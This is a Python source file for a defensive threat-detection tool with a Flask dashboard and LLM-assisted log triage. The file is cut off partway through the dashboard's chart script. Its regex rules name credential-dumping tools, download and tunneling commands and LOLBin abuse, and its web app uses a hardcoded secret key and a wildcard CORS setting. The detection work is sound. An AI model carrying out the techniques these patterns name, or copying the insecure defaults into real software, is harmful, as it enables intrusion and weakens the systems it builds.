import asyncio
import json
import re
import hashlib
import time
from datetime import datetime
from collections import defaultdict, deque
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field, asdict
from enum import Enum
import threading
import queue
import aiohttp
import aiofiles
from pathlib import Path
import logging
from flask import Flask, render_template_string, jsonify
from flask_socketio import SocketIO, emit
import threading
import os

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class Severity(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class AttackCategory(Enum):
    INITIAL_ACCESS = "Initial Access"
    EXECUTION = "Execution"
    PERSISTENCE = "Persistence"
    PRIVILEGE_ESCALATION = "Privilege Escalation"
    DEFENSE_EVASION = "Defense Evasion"
    CREDENTIAL_ACCESS = "Credential Access"
    DISCOVERY = "Discovery"
    LATERAL_MOVEMENT = "Lateral Movement"
    COLLECTION = "Collection"
    EXFILTRATION = "Exfiltration"
    C2 = "Command and Control"
    IMPACT = "Impact"
    ANOMALY = "AI Detected Anomaly"

@dataclass
class DetectionRule:
    id: str
    name: str
    category: AttackCategory
    mitre_id: str
    pattern: re.Pattern
    severity: Severity
    description: str
    false_positive_rate: float = 0.1
    enabled: bool = True

@dataclass
class Alert:
    id: str
    timestamp: datetime
    rule_id: str
    rule_name: str
    category: AttackCategory
    severity: Severity
    source_ip: Optional[str]
    target: Optional[str]
    raw_log: str
    confidence: float
    mitre_technique: str
    ai_analysis: Optional[str] = None
    recommended_action: Optional[str] = None
    context: Dict[str, Any] = field(default_factory=dict)

# MITRE ATT&CK Based Detection Rules
RULES_DATABASE = [
    # T1078 - Valid Accounts (Brute Force Detection)
    DetectionRule(
        id="RULE-001",
        name="Multiple Failed Login Attempts",
        category=AttackCategory.CREDENTIAL_ACCESS,
        mitre_id="T1110",
        pattern=re.compile(r'(?i)(failed|invalid|authentication failure).*(password|login|auth).*(\d+\.\d+\.\d+\.\d+)', re.IGNORECASE),
        severity=Severity.HIGH,
        description="Detects brute force or password spraying attacks"
    ),
    
    # T1059 - Command and Scripting Interpreter (PowerShell Abuse)
    DetectionRule(
        id="RULE-002",
        name="Suspicious PowerShell Execution",
        category=AttackCategory.EXECUTION,
        mitre_id="T1059.001",
        pattern=re.compile(r'(?i)(powershell\.exe|pwsh).*(-enc|-encodedcommand|-nop|-noprofile|-windowstyle hidden|bypass|iex|invoke-expression)', re.IGNORECASE),
        severity=Severity.CRITICAL,
        description="Detects obfuscated or suspicious PowerShell execution"
    ),
    
    # T1003 - OS Credential Dumping (LSASS Access)
    DetectionRule(
        id="RULE-003",
        name="Credential Dumping Attempt",
        category=AttackCategory.CREDENTIAL_ACCESS,
        mitre_id="T1003",
        pattern=re.compile(r'(?i)(lsass\.exe|sam|security|system).*(\bdump\b|\bdumping\b|mimikatz|sekurlsa|comsvcs\.dll)', re.IGNORECASE),
        severity=Severity.CRITICAL,
        description="Detects attempts to dump credentials from memory or SAM database"
    ),
    
    # T1090 - Proxy/Proxy Tools (ngrok, frp)
    DetectionRule(
        id="RULE-004",
        name="Proxy Tunneling Tool Detected",
        category=AttackCategory.C2,
        mitre_id="T1090",
        pattern=re.compile(r'(?i)(ngrok|frpc|frps|pagekite|localtunnel|serveo|localhost\.run)', re.IGNORECASE),
        severity=Severity.HIGH,
        description="Detects usage of tunneling/proxy tools for C2 communication"
    ),
    
    # T1055 - Process Injection
    DetectionRule(
        id="RULE-005",
        name="Process Injection Activity",
        category=AttackCategory.DEFENSE_EVASION,
        mitre_id="T1055",
        pattern=re.compile(r'(?i)(createRemoteThread|VirtualAllocEx|WriteProcessMemory|NtMapViewOfSection|process.*hollow)', re.IGNORECASE),
        severity=Severity.HIGH,
        description="Detects potential process injection techniques"
    ),
    
    # T1036 - Masquerading
    DetectionRule(
        id="RULE-006",
        name="Process Masquerading",
        category=AttackCategory.DEFENSE_EVASION,
        mitre_id="T1036",
        pattern=re.compile(r'(?i)(svchost\.exe|lsass\.exe|csrss\.exe|smss\.exe).*(temp\\|appdata\\|programdata\\|users\\public)', re.IGNORECASE),
        severity=Severity.MEDIUM,
        description="Detects processes masquerading as system processes from unusual locations"
    ),
    
    # T1190 - Exploit Public-Facing Application
    DetectionRule(
        id="RULE-007",
        name="Web Exploitation Attempt",
        category=AttackCategory.INITIAL_ACCESS,
        mitre_id="T1190",
        pattern=re.compile(r'(?i)(sqlmap|nikto|nmap|masscan|\.env|config\.xml|web\.config|/etc/passwd|../|select.*from|union.*select)', re.IGNORECASE),
        severity=Severity.HIGH,
        description="Detects scanning or exploitation attempts against web applications"
    ),
    
    # T1053 - Scheduled Task/Job
    DetectionRule(
        id="RULE-008",
        name="Suspicious Scheduled Task Creation",
        category=AttackCategory.PERSISTENCE,
        mitre_id="T1053",
        pattern=re.compile(r'(?i)(schtasks|at\.exe|cron).*(\.exe|\.ps1|\.bat|\.vbs|powershell|cmd\.exe|/create|/run)', re.IGNORECASE),
        severity=Severity.MEDIUM,
        description="Detects creation of suspicious scheduled tasks for persistence"
    ),
    
    # T1562 - Impair Defenses
    DetectionRule(
        id="RULE-009",
        name="Security Tool Disablement",
        category=AttackCategory.DEFENSE_EVASION,
        mitre_id="T1562",
        pattern=re.compile(r'(?i)(defender|firewall|antivirus|selinux|apparmor).*(disable|stop|off|kill|uninstall|remove)', re.IGNORECASE),
        severity=Severity.CRITICAL,
        description="Detects attempts to disable security tools"
    ),
    
    # T1071 - Application Layer Protocol (DNS Tunneling)
    DetectionRule(
        id="RULE-010",
        name="DNS Tunneling Suspected",
        category=AttackCategory.C2,
        mitre_id="T1071.004",
        pattern=re.compile(r'(?i)([a-z0-9]{30,}\.[a-z]{2,}|dns.*query.*(txt|mx|aaaa).*[a-z0-9]{20,})', re.IGNORECASE),
        severity=Severity.MEDIUM,
        description="Detects potential DNS tunneling via long subdomain queries"
    ),
    
    # T1083 - File and Directory Discovery
    DetectionRule(
        id="RULE-011",
        name="Reconnaissance Activity",
        category=AttackCategory.DISCOVERY,
        mitre_id="T1083",
        pattern=re.compile(r'(?i)(dir.*\/s|ls -la|find.*-name|tree.*\/f|cmd.*\/c.*dir|get-childitem)', re.IGNORECASE),
        severity=Severity.LOW,
        description="Detects file system enumeration activities"
    ),
    
    # T1047 - Windows Management Instrumentation (WMI) Abuse
    DetectionRule(
        id="RULE-012",
        name="WMI Abuse Detected",
        category=AttackCategory.EXECUTION,
        mitre_id="T1047",
        pattern=re.compile(r'(?i)(wmic.*process.*call create|wmiexec|win32_process|Invoke-WmiMethod)', re.IGNORECASE),
        severity=Severity.HIGH,
        description="Detects WMI being used for command execution"
    ),
    
    # T1021 - Remote Services (SSH/RDP Brute Force)
    DetectionRule(
        id="RULE-013",
        name="Remote Access Brute Force",
        category=AttackCategory.LATERAL_MOVEMENT,
        mitre_id="T1021",
        pattern=re.compile(r'(?i)(ssh.*failed|rdp.*failed|connection.*closed.*authenticating|invalid user.*from)', re.IGNORECASE),
        severity=Severity.MEDIUM,
        description="Detects brute force attempts against remote services"
    ),
    
    # T1105 - Ingress Tool Transfer
    DetectionRule(
        id="RULE-014",
        name="Suspicious File Download",
        category=AttackCategory.C2,
        mitre_id="T1105",
        pattern=re.compile(r'(?i)(wget.*http|curl.*http|certutil.*urlcache|bitsadmin.*transfer|downloadstring|invoke-webrequest)', re.IGNORECASE),
        severity=Severity.HIGH,
        description="Detects tools being downloaded to the system"
    ),
    
    # T1496 - Resource Hijacking (Cryptomining)
    DetectionRule(
        id="RULE-015",
        name="Cryptomining Activity",
        category=AttackCategory.IMPACT,
        mitre_id="T1496",
        pattern=re.compile(r'(?i)(xmrig|minerd|stratum\+tcp|nanopool|minexmr|cryptonight|hashrate)', re.IGNORECASE),
        severity=Severity.HIGH,
        description="Detects cryptocurrency mining activity"
    ),
    
    # T1059.003 - Windows Command Shell (CMD Abuse)
    DetectionRule(
        id="RULE-016",
        name="Suspicious CMD Execution",
        category=AttackCategory.EXECUTION,
        mitre_id="T1059.003",
        pattern=re.compile(r'(?i)(cmd\.exe.*\/c.*powershell|cmd\.exe.*\/c.*certutil|cmd\.exe.*\/c.*bitsadmin|cmd\.exe.*&&.*del)', re.IGNORECASE),
        severity=Severity.MEDIUM,
        description="Detects suspicious command prompt usage"
    ),
    
    # T1543 - Create or Modify System Process (Service Creation)
    DetectionRule(
        id="RULE-017",
        name="Suspicious Service Creation",
        category=AttackCategory.PERSISTENCE,
        mitre_id="T1543",
        pattern=re.compile(r'(?i)(sc\.exe.*create|new-service|installutil.*\/logfile=|regsvr32.*\/s)', re.IGNORECASE),
        severity=Severity.HIGH,
        description="Detects creation of suspicious system services"
    ),
    
    # T1218 - System Binary Proxy Execution (LOLBins)
    DetectionRule(
        id="RULE-018",
        name="LOLBins Abuse",
        category=AttackCategory.DEFENSE_EVASION,
        mitre_id="T1218",
        pattern=re.compile(r'(?i)(rundll32\.exe.*javascript|regsvr32.*\/i|mshta.*http|certutil.*-decode|cscript.*\.wsf)', re.IGNORECASE),
        severity=Severity.HIGH,
        description="Detects Living Off The Land binary abuse"
    ),
    
    # T1001 - Data Obfuscation (Base64/Encoding)
    DetectionRule(
        id="RULE-019",
        name="Data Obfuscation Detected",
        category=AttackCategory.C2,
        mitre_id="T1001",
        pattern=re.compile(r'(?i)(base64.*decode|frombase64string| -enc [a-zA-Z0-9+/]{100,}|powershell.*[a-zA-Z0-9+/]{100,})', re.IGNORECASE),
        severity=Severity.MEDIUM,
        description="Detects use of encoding to obfuscate commands"
    ),
    
    # T1497 - Virtualization/Sandbox Evasion
    DetectionRule(
        id="RULE-020",
        name="Sandbox Evasion Technique",
        category=AttackCategory.DEFENSE_EVASION,
        mitre_id="T1497",
        pattern=re.compile(r'(?i)(vmware|virtualbox|sandboxie|cuckoo|qemu|xen).*detect|check.*debug|IsDebuggerPresent', re.IGNORECASE),
        severity=Severity.MEDIUM,
        description="Detects malware checking for virtualized environments"
    )
]

class LogBuffer:
    """Circular buffer for maintaining log context"""
    def __init__(self, size: int = 1000):
        self.buffer = deque(maxlen=size)
        self.lock = threading.Lock()
    
    def add(self, log_line: str):
        with self.lock:
            self.buffer.append({
                'timestamp': datetime.now().isoformat(),
                'log': log_line
            })
    
    def get_context(self, count: int = 10) -> List[Dict]:
        with self.lock:
            return list(self.buffer)[-count:]

class StatisticsTracker:
    """Track detection statistics"""
    def __init__(self):
        self.stats = {
            'total_logs_processed': 0,
            'alerts_generated': 0,
            'rule_hits': defaultdict(int),
            'severity_counts': defaultdict(int),
            'category_counts': defaultdict(int),
            'timeline': deque(maxlen=100),
            'top_source_ips': defaultdict(int),
            'mitre_coverage': set()
        }
        self.lock = threading.Lock()
    
    def update(self, alert: Alert):
        with self.lock:
            self.stats['alerts_generated'] += 1
            self.stats['rule_hits'][alert.rule_id] += 1
            self.stats['severity_counts'][alert.severity.value] += 1
            self.stats['category_counts'][alert.category.value] += 1
            self.stats['mitre_coverage'].add(alert.mitre_technique)
            if alert.source_ip:
                self.stats['top_source_ips'][alert.source_ip] += 1
            self.stats['timeline'].append({
                'time': datetime.now().isoformat(),
                'severity': alert.severity.value,
                'category': alert.category.value
            })
    
    def increment_logs(self):
        with self.lock:
            self.stats['total_logs_processed'] += 1
    
    def get_stats(self) -> Dict:
        with self.lock:
            return {
                **self.stats,
                'mitre_coverage': list(self.stats['mitre_coverage']),
                'top_source_ips': dict(sorted(
                    self.stats['top_source_ips'].items(), 
                    key=lambda x: x[1], 
                    reverse=True
                )[:10]),
                'rule_hits': dict(self.stats['rule_hits']),
                'severity_counts': dict(self.stats['severity_counts']),
                'category_counts': dict(self.stats['category_counts']),
                'timeline': list(self.stats['timeline'])
            }

class OllamaAnalyzer:
    """AI-powered log analysis using Ollama"""
    def __init__(self, base_url: str = "http://localhost:11434", model: str = "llama3.2"):
        self.base_url = base_url
        self.model = model
        self.session = None
        self.enabled = True
        self.last_call = 0
        self.rate_limit = 1  # seconds between calls
    
    async def initialize(self):
        self.session = aiohttp.ClientSession()
    
    async def analyze(self, log_line: str, context: List[Dict]) -> Optional[Dict]:
        if not self.enabled or not self.session:
            return None
        
        # Rate limiting
        current_time = time.time()
        if current_time - self.last_call < self.rate_limit:
            return None
        
        self.last_call = current_time
        
        # Prepare context
        context_str = "\n".join([f"[{c['timestamp']}] {c['log']}" for c in context[-5:]])
        
        prompt = f"""You are a cybersecurity expert analyzing system logs for threats. 
Analyze the following log entry and recent context for security threats, anomalies, or attack patterns.

Recent Context:
{context_str}

Current Log Entry:
{log_line}

Provide a JSON response with this exact structure:
{{
    "is_threat": boolean,
    "threat_type": "none" | "malware" | "intrusion" | "anomaly" | "reconnaissance" | "data_exfiltration",
    "confidence": 0.0-1.0,
    "description": "brief explanation",
    "recommended_action": "specific remediation step",
    "indicators": ["list", "of", "ioc", "indicators"]
}}

Respond ONLY with the JSON object, no other text."""

        try:
            async with self.session.post(
                f"{self.base_url}/api/generate",
                json={
                    "model": self.model,
                    "prompt": prompt,
                    "stream": False,
                    "options": {"temperature": 0.1}
                },
                timeout=aiohttp.ClientTimeout(total=10)
            ) as response:
                if response.status == 200:
                    result = await response.json()
                    try:
                        # Extract JSON from response
                        response_text = result.get('response', '')
                        # Find JSON block
                        json_match = re.search(r'\{.*\}', response_text, re.DOTALL)
                        if json_match:
                            analysis = json.loads(json_match.group())
                            return analysis
                    except json.JSONDecodeError:
                        logger.warning("Failed to parse AI response as JSON")
                        return None
                else:
                    logger.warning(f"Ollama API returned status {response.status}")
                    return None
        except Exception as e:
            logger.error(f"Ollama analysis error: {e}")
            return None
    
    async def close(self):
        if self.session:
            await self.session.close()

class LogAnalyzer:
    """Main log analysis engine"""
    def __init__(self, ollama_url: str = "http://localhost:11434"):
        self.rules = RULES_DATABASE
        self.alerts: List[Alert] = []
        self.alert_queue = queue.Queue()
        self.buffer = LogBuffer()
        self.stats = StatisticsTracker()
        self.ai_analyzer = OllamaAnalyzer(base_url=ollama_url)
        self.running = False
        self.alert_callbacks = []
        
        # IP reputation cache
        self.suspicious_ips = defaultdict(lambda: {'count': 0, 'first_seen': None, 'alerts': []})
        
    def register_alert_callback(self, callback):
        self.alert_callbacks.append(callback)
    
    def extract_ip(self, log_line: str) -> Optional[str]:
        """Extract IP address from log line"""
        ip_pattern = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')
        match = ip_pattern.search(log_line)
        return match.group(0) if match else None
    
    def calculate_confidence(self, rule: DetectionRule, log_line: str, ip: Optional[str]) -> float:
        """Calculate confidence score based on multiple factors"""
        base_confidence = 0.7
        
        # Check for multiple indicators in same line
        indicators = 0
        if re.search(r'(?i)(admin|root|system)', log_line):
            indicators += 0.1
        if re.search(r'(?i)(error|fail|denied)', log_line):
            indicators += 0.1
        if ip and self.suspicious_ips[ip]['count'] > 3:
            indicators += 0.2
        
        # Time-based correlation (if IP has previous alerts)
        if ip and self.suspicious_ips[ip]['alerts']:
            last_alert = self.suspicious_ips[ip]['alerts'][-1]
            time_diff = (datetime.now() - last_alert).total_seconds()
            if time_diff < 300:  # Within 5 minutes
                indicators += 0.1
        
        confidence = min(base_confidence + indicators, 1.0)
        return confidence
    
    async def analyze_line(self, log_line: str) -> List[Alert]:
        """Analyze a single log line against all rules and AI"""
        alerts = []
        self.buffer.add(log_line)
        self.stats.increment_logs()
        
        ip = self.extract_ip(log_line)
        
        # Rule-based detection
        for rule in self.rules:
            if not rule.enabled:
                continue
            
            if rule.pattern.search(log_line):
                confidence = self.calculate_confidence(rule, log_line, ip)
                
                alert = Alert(
                    id=hashlib.md5(f"{log_line}{rule.id}{time.time()}".encode()).hexdigest()[:12],
                    timestamp=datetime.now(),
                    rule_id=rule.id,
                    rule_name=rule.name,
                    category=rule.category,
                    severity=rule.severity,
                    source_ip=ip,
                    target=None,
                    raw_log=log_line[:500],  # Truncate long logs
                    confidence=confidence,
                    mitre_technique=rule.mitre_id
                )
                
                # Update IP tracking
                if ip:
                    if self.suspicious_ips[ip]['first_seen'] is None:
                        self.suspicious_ips[ip]['first_seen'] = datetime.now()
                    self.suspicious_ips[ip]['count'] += 1
                    self.suspicious_ips[ip]['alerts'].append(datetime.now())
                
                alerts.append(alert)
                self.stats.update(alert)
        
        # AI Analysis (async, non-blocking for rules)
        if len(alerts) == 0:  # Only AI analyze if no rule matched (reduces noise)
            ai_result = await self.ai_analyzer.analyze(log_line, self.buffer.get_context())
            if ai_result and ai_result.get('is_threat') and ai_result.get('confidence', 0) > 0.8:
                alert = Alert(
                    id=hashlib.md5(f"{log_line}AI{time.time()}".encode()).hexdigest()[:12],
                    timestamp=datetime.now(),
                    rule_id="AI-001",
                    rule_name=f"AI Detected: {ai_result.get('threat_type', 'Unknown')}",
                    category=AttackCategory.ANOMALY,
                    severity=Severity.HIGH if ai_result.get('confidence', 0) > 0.9 else Severity.MEDIUM,
                    source_ip=ip,
                    target=None,
                    raw_log=log_line[:500],
                    confidence=ai_result.get('confidence', 0.5),
                    mitre_technique="AI-ANALYSIS",
                    ai_analysis=ai_result.get('description'),
                    recommended_action=ai_result.get('recommended_action')
                )
                alerts.append(alert)
                self.stats.update(alert)
        
        # Store and notify
        for alert in alerts:
            self.alerts.append(alert)
            self.alert_queue.put(alert)
            for callback in self.alert_callbacks:
                callback(alert)
        
        return alerts
    
    async def tail_file(self, filepath: str):
        """Asynchronously tail a log file"""
        try:
            async with aiofiles.open(filepath, 'r') as f:
                # Seek to end
                await f.seek(0, 2)
                
                while self.running:
                    line = await f.readline()
                    if not line:
                        await asyncio.sleep(0.1)
                        continue
                    
                    line = line.strip()
                    if line:
                        await self.analyze_line(line)
        except Exception as e:
            logger.error(f"Error tailing file {filepath}: {e}")
    
    async def start(self, log_files: List[str]):
        """Start the analyzer"""
        self.running = True
        await self.ai_analyzer.initialize()
        
        # Create tasks for each log file
        tasks = [self.tail_file(f) for f in log_files if os.path.exists(f)]
        
        if tasks:
            await asyncio.gather(*tasks)
    
    def stop(self):
        """Stop the analyzer"""
        self.running = False
        asyncio.create_task(self.ai_analyzer.close())

# Flask Web Application with Socket.IO
app = Flask(__name__)
app.config['SECRET_KEY'] = 'cybersecurity-log-analyzer-secret'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Global analyzer instance
analyzer = LogAnalyzer()

def alert_callback(alert: Alert):
    """Callback to emit alerts via WebSocket"""
    socketio.emit('new_alert', {
        'id': alert.id,
        'timestamp': alert.timestamp.isoformat(),
        'rule_name': alert.rule_name,
        'category': alert.category.value,
        'severity': alert.severity.value,
        'source_ip': alert.source_ip,
        'confidence': alert.confidence,
        'mitre_technique': alert.mitre_technique,
        'ai_analysis': alert.ai_analysis,
        'recommended_action': alert.recommended_action,
        'raw_log': alert.raw_log[:200] + '...' if len(alert.raw_log) > 200 else alert.raw_log
    })

analyzer.register_alert_callback(alert_callback)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SentinelAI - Real-time Threat Detection</title>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
        }
        
        .header {
            background: rgba(15, 23, 42, 0.9);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid #334155;
            padding: 1rem 2rem;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.3);
        }
        
        .header h1 {
            font-size: 1.5rem;
            background: linear-gradient(90deg, #60a5fa, #a78bfa);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        .status-indicator {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            font-size: 0.875rem;
            color: #94a3b8;
        }
        
        .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #22c55e;
            box-shadow: 0 0 10px #22c55e;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 2rem;
        }
        
        .dashboard-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 1.5rem;
            margin-bottom: 2rem;
        }
        
        .card {
            background: rgba(30, 41, 59, 0.6);
            backdrop-filter: blur(10px);
            border: 1px solid #334155;
            border-radius: 12px;
            padding: 1.5rem;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        
        .card:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
        }
        
        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1rem;
        }
        
        .card-title {
            font-size: 0.875rem;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            color: #94a3b8;
        }
        
        .card-value {
            font-size: 2rem;
            font-weight: 700;
            color: #f8fafc;
        }
        
        .severity-badge {
            display: inline-flex;
            align-items: center;
            padding: 0.25rem 0.75rem;
            border-radius: 9999px;
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
        }
        
        .severity-critical { background: rgba(239, 68, 68, 0.2); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); }
        .severity-high { background: rgba(249, 115, 22, 0.2); color: #f97316; border: 1px solid rgba(249, 115, 22, 0.3); }
        .severity-medium { background: rgba(234, 179, 8, 0.2); color: #eab308; border: 1px solid rgba(234, 179, 8, 0.3); }
        .severity-low { background: rgba(34, 197, 94, 0.2); color: #22c55e; border: 1px solid rgba(34, 197, 94, 0.3); }
        
        .alerts-container {
            background: rgba(30, 41, 59, 0.6);
            backdrop-filter: blur(10px);
            border: 1px solid #334155;
            border-radius: 12px;
            overflow: hidden;
        }
        
        .alerts-header {
            background: rgba(15, 23, 42, 0.8);
            padding: 1rem 1.5rem;
            border-bottom: 1px solid #334155;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .alerts-list {
            max-height: 600px;
            overflow-y: auto;
        }
        
        .alert-item {
            padding: 1rem 1.5rem;
            border-bottom: 1px solid #334155;
            display: grid;
            grid-template-columns: auto 1fr auto;
            gap: 1rem;
            align-items: start;
            animation: slideIn 0.3s ease-out;
            cursor: pointer;
            transition: background 0.2s;
        }
        
        .alert-item:hover {
            background: rgba(51, 65, 85, 0.5);
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(-20px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }
        
        .alert-time {
            font-size: 0.75rem;
            color: #64748b;
            font-family: monospace;
        }
        
        .alert-content {
            min-width: 0;
        }
        
        .alert-title {
            font-weight: 600;
            color: #f8fafc;
            margin-bottom: 0.25rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        .alert-meta {
            font-size: 0.875rem;
            color: #94a3b8;
            display: flex;
            gap: 1rem;
            flex-wrap: wrap;
        }
        
        .alert-log {
            font-family: monospace;
            font-size: 0.75rem;
            color: #64748b;
            margin-top: 0.5rem;
            padding: 0.5rem;
            background: rgba(15, 23, 42, 0.5);
            border-radius: 4px;
            overflow-x: auto;
            white-space: nowrap;
        }
        
        .mitre-tag {
            display: inline-flex;
            align-items: center;
            padding: 0.125rem 0.5rem;
            background: rgba(96, 165, 250, 0.2);
            color: #60a5fa;
            border-radius: 4px;
            font-size: 0.75rem;
            font-family: monospace;
        }
        
        .charts-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
            gap: 1.5rem;
            margin-top: 2rem;
        }
        
        .chart-container {
            background: rgba(30, 41, 59, 0.6);
            backdrop-filter: blur(10px);
            border: 1px solid #334155;
            border-radius: 12px;
            padding: 1.5rem;
            height: 300px;
            position: relative;
        }
        
        .empty-state {
            text-align: center;
            padding: 3rem;
            color: #64748b;
        }
        
        .filter-bar {
            display: flex;
            gap: 1rem;
            margin-bottom: 1rem;
            flex-wrap: wrap;
        }
        
        .filter-btn {
            padding: 0.5rem 1rem;
            background: rgba(51, 65, 85, 0.5);
            border: 1px solid #475569;
            color: #e2e8f0;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.2s;
            font-size: 0.875rem;
        }
        
        .filter-btn:hover, .filter-btn.active {
            background: rgba(96, 165, 250, 0.2);
            border-color: #60a5fa;
        }
        
        .confidence-bar {
            width: 100%;
            height: 4px;
            background: #334155;
            border-radius: 2px;
            margin-top: 0.5rem;
            overflow: hidden;
        }
        
        .confidence-fill {
            height: 100%;
            background: linear-gradient(90deg, #60a5fa, #a78bfa);
            transition: width 0.3s;
        }
        
        .ai-badge {
            display: inline-flex;
            align-items: center;
            gap: 0.25rem;
            padding: 0.125rem 0.5rem;
            background: linear-gradient(90deg, rgba(168, 85, 247, 0.2), rgba(236, 72, 153, 0.2));
            color: #e879f9;
            border-radius: 4px;
            font-size: 0.75rem;
            border: 1px solid rgba(236, 72, 153, 0.3);
        }
        
        @media (max-width: 768px) {
            .dashboard-grid {
                grid-template-columns: 1fr;
            }
            .charts-grid {
                grid-template-columns: 1fr;
            }
            .alert-item {
                grid-template-columns: 1fr;
            }
        }
        
        /* Scrollbar styling */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        ::-webkit-scrollbar-track {
            background: #0f172a;
        }
        ::-webkit-scrollbar-thumb {
            background: #334155;
            border-radius: 4px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #475569;
        }
    </style>
</head>
<body>
    <div class="header">
        <div style="display: flex; justify-content: space-between; align-items: center;">
            <h1>
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
                </svg>
                SentinelAI
            </h1>
            <div class="status-indicator">
                <span class="status-dot"></span>
                <span>Live Monitoring Active</span>
            </div>
        </div>
    </div>

    <div class="container">
        <div class="dashboard-grid">
            <div class="card">
                <div class="card-header">
                    <span class="card-title">Total Alerts</span>
                    <span class="severity-badge severity-high">Live</span>
                </div>
                <div class="card-value" id="total-alerts">0</div>
                <div style="margin-top: 0.5rem; font-size: 0.875rem; color: #64748b;">
                    Last 24 hours
                </div>
            </div>
            
            <div class="card">
                <div class="card-header">
                    <span class="card-title">Critical Threats</span>
                </div>
                <div class="card-value" id="critical-count" style="color: #ef4444;">0</div>
                <div style="margin-top: 0.5rem; font-size: 0.875rem; color: #64748b;">
                    Immediate action required
                </div>
            </div>
            
            <div class="card">
                <div class="card-header">
                    <span class="card-title">MITRE Coverage</span>
                </div>
                <div class="card-value" id="mitre-count">0</div>
                <div style="margin-top: 0.5rem; font-size: 0.875rem; color: #64748b;">
                    Techniques detected
                </div>
            </div>
            
            <div class="card">
                <div class="card-header">
                    <span class="card-title">AI Analysis</span>
                </div>
                <div class="card-value" id="ai-count">0</div>
                <div style="margin-top: 0.5rem; font-size: 0.875rem; color: #64748b;">
                    Anomalies detected
                </div>
            </div>
        </div>

        <div class="alerts-container">
            <div class="alerts-header">
                <h2 style="font-size: 1.125rem; color: #f8fafc;">Real-time Threat Alerts</h2>
                <div class="filter-bar">
                    <button class="filter-btn active" onclick="filterAlerts('all')">All</button>
                    <button class="filter-btn" onclick="filterAlerts('critical')">Critical</button>
                    <button class="filter-btn" onclick="filterAlerts('high')">High</button>
                    <button class="filter-btn" onclick="filterAlerts('ai')">AI Detected</button>
                </div>
            </div>
            <div class="alerts-list" id="alerts-list">
                <div class="empty-state">
                    <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" style="margin-bottom: 1rem; opacity: 0.5;">
                        <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
                    </svg>
                    <p>Monitoring active... Waiting for threats</p>
                </div>
            </div>
        </div>

        <div class="charts-grid">
            <div class="chart-container">
                <h3 style="margin-bottom: 1rem; font-size: 0.875rem; color: #94a3b8;">Attack Categories</h3>
                <canvas id="categoryChart"></canvas>
            </div>
            <div class="chart-container">
                <h3 style="margin-bottom: 1rem; font-size: 0.875rem; color: #94a3b8;">Severity Distribution</h3>
                <canvas id="severityChart"></canvas>
            </div>
        </div>
    </div>

    <script>
        const socket = io();
        let alerts = [];
        let currentFilter = 'all';
        
        // Charts
        let categoryChart, severityChart;
        
        function initCharts() {
            const ctx1 = document.getElementById('categoryChart').getContext('2d');
            const ctx2 = document.getElementById('severityChart').getContext('2d');
            
            categoryChart = new Chart(ctx1, {
                type: 'doughnut',
                data: {
                    labels: [],
                    datasets: [{
                        data: [],
                        backgroundColor: [
                            '#60a5fa', '#a78bfa', '#f472b6', '#fbbf24', 
                            '#34d399', '#22d3ee', '#f87171', '#a3e635'
                        ],
                        borderWidth: 0
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {
                        legend: {
                            position: 'right',
                            labels: { color: '#94a3b8', font: { size: 11 } }
                        }
                    }
                }
            });
            
            severityChart = new Chart(ctx2, {
                type: 'bar',
                data: {
                    labels: ['Critical', 'High', 'Medium', 'Low'],
                    datasets: [{
                        label: 'Alerts',
                        data: [0, 0, 0, 0],
                        backgroundColor: ['#ef4444', '#f97316', '#eab308', '#22c55e'],
                        borderRadius: 4
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {
                        legend: { display: false }
                    },
                    scales: {
